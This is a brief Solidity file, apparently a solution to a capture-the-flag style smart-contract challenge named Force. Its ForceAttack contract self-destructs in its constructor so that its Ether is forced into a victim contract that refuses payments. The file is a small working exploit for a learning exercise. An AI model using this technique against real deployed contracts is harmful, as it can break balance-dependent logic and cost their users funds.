// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Force} from "./Force.sol";
contract ForceAttack {
    Force victim;
    constructor(address _v) payable {
        victim = Force(_v);
        selfdestruct(payable(address(victim)));
        
        }
}